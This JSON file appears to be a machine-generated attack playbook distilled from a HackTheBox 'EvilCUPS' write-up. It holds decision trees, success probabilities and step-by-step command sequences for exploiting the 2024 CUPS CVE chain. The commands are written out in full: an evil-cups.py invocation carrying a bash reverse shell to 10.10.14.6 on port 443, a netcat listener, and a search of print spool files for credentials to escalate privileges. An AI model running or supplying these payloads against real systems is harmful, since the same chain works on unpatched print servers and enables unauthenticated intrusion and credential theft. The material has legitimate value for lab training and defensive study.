@@ -1,0 +1,660 @@
+{
+  "writeup_id": "Htb_Evilcups",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_cups_rce_chain",
+    "primary_services": [
+      "cups",
+      "ssh"
+    ],
+    "port_signature": "22+631",
+    "service_combination": "ssh+cups",
+    "os_family": "linux",
+    "environment_type": "print_server",
+    "entry_vector": "cups_cve_chain",
+    "privilege_path": "cups_rce_to_root_credential",
+    "attack_complexity": "medium",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "cups_2.4.2_vulnerable",
+      "udp_631_cups_browsed",
+      "four_cve_chain_exploit",
+      "print_job_artifacts"
+    ],
+    "environmental_clues": [
+      "cups_web_interface",
+      "printer_administration_panel",
+      "completed_print_jobs",
+      "debian_12_bookworm"
+    ],
+    "similar_scenarios": [
+      "cups_exploitation",
+      "print_server_compromise"
+    ],
+    "unique_aspects": [
+      "september_2024_cups_cves",
+      "cups_browsed_remote_printer_add",
+      "foomatic_rip_command_injection",
+      "ppd_file_injection_chain"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "CUPS_CVE_Chain_Exploitation",
+        "success_reason": "Vulnerable CUPS 2.4.2 service exposed on UDP/TCP 631 with all four CVEs present",
+        "prerequisite_indicators": [
+          "cups_service_running",
+          "udp_631_accessible",
+          "cups_browsed_enabled",
+          "vulnerable_version_2.4.2"
+        ],
+        "recognition_patterns": [
+          "CUPS version 2.4.2 or earlier",
+          "UDP 631 open|filtered state",
+          "cups-browsed service active",
+          "foomatic-rip filter available"
+        ],
+        "failure_modes": [
+          "cups_browsed_disabled",
+          "udp_631_filtered",
+          "patched_cups_version",
+          "foomatic_rip_unavailable"
+        ],
+        "environmental_factors": [
+          "default_cups_configuration",
+          "unpatched_debian_12_system",
+          "network_accessible_printing_service",
+          "legacy_printing_infrastructure"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "2-5 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "CUPS 2.4.2 vulnerable service",
+        "discovery_method": "nmap service detection on TCP 631",
+        "why_critical": "Four chained CVEs allow remote code execution without authentication",
+        "how_to_recognize": [
+          "CUPS version banner 2.4.2",
+          "UDP 631 responds to packets",
+          "printer management interface accessible",
+          "cups-browsed service running"
+        ],
+        "follow_up_actions": [
+          "verify_udp_631_accessible",
+          "check_cups_browsed_status",
+          "prepare_malicious_printer_payload",
+          "setup_ipp_server_listener"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "unauthenticated_remote",
+        "escalation_method": "CVE_chain_to_RCE",
+        "why_possible": "Four CVEs chain together: CVE-2024-47176 (cups-browsed), CVE-2024-47076 (libcupsfilters), CVE-2024-47175 (libppd), CVE-2024-47177 (cups-filters)",
+        "recognition_signs": [
+          "cups_browsed_accepts_remote_printers",
+          "ipp_attributes_unsanitized",
+          "ppd_file_injection_possible",
+          "foomatic_rip_command_injection"
+        ],
+        "exploitation_path": "UDP packet → IPP request → malicious printer → print test page → RCE as lp user"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,631 open on Linux host with CUPS 2.4.2",
+        "decision": "Check for recent CUPS CVEs (2024-47176/47076/47175/47177)",
+        "reasoning": "CUPS 2.4.2 vulnerable to September 2024 CVE chain allowing RCE",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "cups_web_enumeration",
+            "when": "if CVEs not applicable"
+          },
+          {
+            "option": "ssh_enumeration",
+            "when": "if CUPS exploitation fails"
+          }
+        ],
+        "success_indicators": [
+          "cups_browsed_udp_631_accessible",
+          "cups_version_vulnerable",
+          "can_add_malicious_printer"
+        ],
+        "next_decision": "exploit_cups_cve_chain"
+      },
+      {
+        "step": 2,
+        "situation": "CUPS vulnerable to CVE chain exploitation",
+        "decision": "Use evil-cups script to inject malicious printer with reverse shell",
+        "reasoning": "Four CVE chain allows remote printer addition and RCE via foomatic-rip",
+        "confidence": 0.9,
+        "prerequisites": [
+          "udp_631_accessible",
+          "can_host_malicious_ipp_server"
+        ],
+        "success_indicators": [
+          "malicious_printer_added",
+          "test_page_triggers_shell"
+        ],
+        "failure_fallbacks": [
+          "manual_cups_exploitation",
+          "alternative_payloads"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Got shell as lp user, need privilege escalation",
+        "decision": "Check CUPS spool directory for sensitive print job data",
+        "reasoning": "Print jobs often contain sensitive documents including credentials",
+        "confidence": 0.75,
+        "prerequisites": [
+          "shell_as_lp_user"
+        ],
+        "success_indicators": [
+          "print_job_files_found",
+          "sensitive_data_in_jobs"
+        ],
+        "failure_fallbacks": [
+          "standard_linux_privesc",
+          "cups_config_files"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_cups_cves_applicable": {
+        "action": "exploit_cups_cve_chain",
+        "tools": [
+          "evil-cups.py",
+          "netcat"
+        ],
+        "next_phase": "trigger_rce_via_test_page"
+      },
+      "if_cups_exploitation_succeeds": {
+        "action": "enumerate_print_jobs_for_privesc",
+        "locations": [
+          "/var/spool/cups",
+          "/var/spool/cups/tmp"
+        ],
+        "file_patterns": [
+          "d[0-9]{5}-[0-9]{3}",
+          "c[0-9]{5}"
+        ]
+      },
+      "if_print_jobs_found": {
+        "action": "extract_sensitive_data",
+        "file_types": [
+          "postscript",
+          "pdf",
+          "plaintext"
+        ],
+        "search_for": [
+          "passwords",
+          "credentials",
+          "sensitive_documents"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_cups_version_for_recent_cves",
+        "reasoning": "CUPS CVEs provide direct RCE path",
+        "applicability": "cups_service_detected"
+      },
+      {
+        "rule": "examine_print_spool_directories_after_cups_compromise",
+        "reasoning": "print_jobs_often_contain_sensitive_information",
+        "applicability": "cups_user_shell_obtained"
+      },
+      {
+        "rule": "use_nohup_for_cups_reverse_shells",
+        "reasoning": "prevents_shell_death_when_printer_process_crashes",
+        "applicability": "cups_rce_exploitation"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "CUPS_CVE_Chain_Exploit",
+        "mitre_id": "T1203",
+        "required_services": [
+          "cups",
+          "ipp"
+        ],
+        "required_ports": [
+          631
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "cups_service_running",
+          "cups_browsed_enabled",
+          "udp_631_accessible",
+          "cups_version_vulnerable"
+        ],
+        "success_indicators": [
+          "cups_web_interface_accessible",
+          "printer_enumeration_successful",
+          "udp_631_responds",
+          "cups_version_2.4.x_detected"
+        ],
+        "incompatible_with": [
+          "cups_browsed_disabled",
+          "cups_patched_version",
+          "udp_631_filtered",
+          "cups_not_installed"
+        ],
+        "confidence_boosters": [
+          "cups_version_2.4.2_or_lower",
+          "existing_printers_visible",
+          "cups_administration_interface_present",
+          "debian_bookworm_detected"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "30-60 seconds"
+      },
+      {
+        "technique": "SSH_Service_Enumeration",
+        "mitre_id": "T1046",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "ssh_service_running",
+          "tcp_22_accessible"
+        ],
+        "success_indicators": [
+          "ssh_banner_retrieved",
+          "openssh_version_detected",
+          "host_key_algorithms_enumerated"
+        ],
+        "incompatible_with": [
+          "ssh_disabled",
+          "port_22_filtered",
+          "connection_refused"
+        ],
+        "confidence_boosters": [
+          "openssh_version_9.2p1",
+          "debian_host_detected",
+          "standard_ssh_configuration"
+        ],
+        "typical_success_rate": 0.95,
+        "estimated_time": "1-2 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "cups_service": {
+        "port_indicators": [
+          631
+        ],
+        "service_indicators": [
+          "ipp",
+          "cups"
+        ],
+        "banner_indicators": [
+          "CUPS",
+          "Internet Printing Protocol"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "Debian",
+          "Ubuntu"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_interface": {
+        "port_indicators": [
+          631,
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "ipp"
+        ],
+        "technology_indicators": [
+          "cups",
+          "web interface"
+        ],
+        "confidence_threshold": 0.88
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "cups_cve_chain_exploit",
+          "when": "cups_service_detected_and_vulnerable_version",
+          "reason": "recent_cves_high_success_rate_rce_without_auth"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "cups_web_interface_enumeration",
+          "when": "cups_web_interface_accessible",
+          "reason": "may_reveal_printer_information_and_jobs"
+        },
+        {
+          "attack": "ssh_enumeration",
+          "when": "ssh_service_detected",
+          "reason": "standard_service_may_allow_credential_attacks"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "port_scanning_additional_services",
+          "when": "limited_attack_surface_detected",
+          "reason": "may_reveal_additional_services_on_non_standard_ports"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "CUPS Remote Code Execution Chain",
+        "mitre_id": "T1203",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "evil-cups.py",
+            "command_template": "python evil-cups.py {local_ip} {target_ip} '{command}'",
+            "actual_command": "python evil-cups.py 10.10.14.6 10.10.11.40 'bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"'",
+            "output_pattern": "target connected, sending payload",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "nmap",
+            "command_template": "nmap -sU -p 631 {target_ip}",
+            "actual_command": "nmap -sU -p 631 10.10.11.40",
+            "success_factors": [
+              "cups_udp_port_open",
+              "cups_browsed_service_running"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "cups_version_vulnerable",
+          "udp_631_accessible",
+          "cups_browsed_enabled",
+          "network_connectivity_to_target"
+        ],
+        "success_indicators": [
+          "malicious_printer_appears_in_cups_web_interface",
+          "reverse_shell_connection_established",
+          "command_execution_as_lp_user"
+        ],
+        "common_failures": [
+          "cups_browsed_disabled",
+          "firewall_blocking_udp_631",
+          "cups_version_patched",
+          "network_connectivity_issues"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "file_system_enumeration",
+          "credential_harvesting"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "CUPS Print Job Analysis",
+        "mitre_id": "T1005",
+        "category": "collection",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "cat",
+            "command_template": "cat /var/spool/cups/d{job_id}-001",
+            "actual_command": "cat /var/spool/cups/d00001-001",
+            "output_pattern": "%!PS-Adobe-3.0",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "access_as_lp_user",
+          "print_jobs_exist_on_system",
+          "read_access_to_spool_directory"
+        ],
+        "success_indicators": [
+          "postscript_file_readable",
+          "sensitive_information_in_print_jobs",
+          "credentials_found_in_documents"
+        ],
+        "common_failures": [
+          "no_historical_print_jobs",
+          "print_jobs_contain_no_sensitive_data",
+          "insufficient_permissions"
+        ],
+        "follow_up_techniques": [
+          "postscript_to_pdf_conversion",
+          "document_analysis",
+          "credential_validation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "evil-cups.py",
+        "use_case": "cups_vulnerability_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "cups_environments"
+        ],
+        "alternatives": [
+          "manual_ipp_exploitation",
+          "metasploit_cups_modules"
+        ],
+        "best_practices": [
+          "use_nohup_for_persistent_shells",
+          "verify_udp_631_accessibility_first",
+          "test_with_simple_commands_initially"
+        ]
+      },
+      {
+        "tool": "nmap",
+        "use_case": "cups_service_discovery",
+        "effectiveness_rating": 4,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "network_reconnaissance"
+        ],
+        "alternatives": [
+          "masscan",
+          "zmap"
+        ],
+        "best_practices": [
+          "scan_both_tcp_and_udp_631",
+          "identify_cups_version_for_vulnerability_assessment",
+          "check_for_administrative_interfaces"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "cups_exploitation_chain",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -p 22,631 -sCV 10.10.11.40",
+            "purpose": "Identify CUPS service and version",
+            "expected_output": "631/tcp open ipp CUPS 2.4"
+          },
+          {
+            "step": 2,
+            "command": "nmap -sU -p 631 10.10.11.40",
+            "purpose": "Verify UDP CUPS port accessibility",
+            "expected_output": "631/udp open|filtered ipp"
+          },
+          {
+            "step": 3,
+            "command": "python evil-cups.py 10.10.14.6 10.10.11.40 'bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"'",
+            "purpose": "Deploy malicious printer",
+            "expected_output": "target connected, sending payload"
+          },
+          {
+            "step": 4,
+            "command": "nc -lnvp 443",
+            "purpose": "Setup reverse shell listener",
+            "expected_output": "Listening on 0.0.0.0 443"
+          },
+          {
+            "step": 5,
+            "command": "Print Test Page via CUPS web interface",
+            "purpose": "Trigger RCE through print job",
+            "expected_output": "Reverse shell connection as lp user"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "3-8 minutes"
+      },
+      {
+        "sequence_name": "cups_print_job_analysis",
+        "steps": [
+          {
+            "step": 1,
+            "command": "ls -la /var/spool/cups/",
+            "purpose": "Enumerate print job files",
+            "expected_output": "Directory listing with d00001-001 files"
+          },
+          {
+            "step": 2,
+            "command": "cat /var/spool/cups/d00001-001",
+            "purpose": "Extract print job content",
+            "expected_output": "PostScript document content"
+          },
+          {
+            "step": 3,
+            "command": "file /var/spool/cups/d00001-001",
+            "purpose": "Identify file type",
+            "expected_output": "PostScript document text"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "2-5 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "EvilCUPS",
+      "difficulty": "Medium",
+      "os": "Linux (Debian 12)",
+      "platform": "HackTheBox",
+      "release_date": "2024-10-02",
+      "author": "ippsec",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "cups_exploit",
+        "cve_chain"
+      ],
+      "key_vulnerabilities": [
+        "cups_cve_2024",
+        "print_service_rce"
+      ],
+      "environment_type": "linux_print_server",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "recent_cve_exploitation",
+        "cups_security",
+        "print_service_attacks"
+      ],
+      "prerequisite_knowledge": [
+        "linux_fundamentals",
+        "network_services",
+        "exploit_chaining"
+      ]
+    },
+    "categorization": {
+      "primary_category": "recent_exploits",
+      "subcategories": [
+        "cups_exploitation",
+        "service_exploitation"
+      ],
+      "attack_types": [
+        "remote_code_execution",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "patch_management",
+        "service_hardening",
+        "print_service_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Printer",
+        "Networked",
+        "Postman"
+      ],
+      "similarity_reasons": [
+        "service_exploitation",
+        "linux_environment",
+        "network_services"
+      ],
+      "unique_aspects": [
+        "2024_cups_cves",
+        "recent_vulnerability_chain",
+        "print_job_analysis"
+      ],
+      "difficulty_factors": [
+        "current_exploit_techniques",
+        "cve_chaining",
+        "pdf_analysis"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T01:27:17.223976",
+    "original_file": "0xdf_writeups/Htb Evilcups.md",
+    "content_length": 30741,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.8333333333333334,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.3333333333333333,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
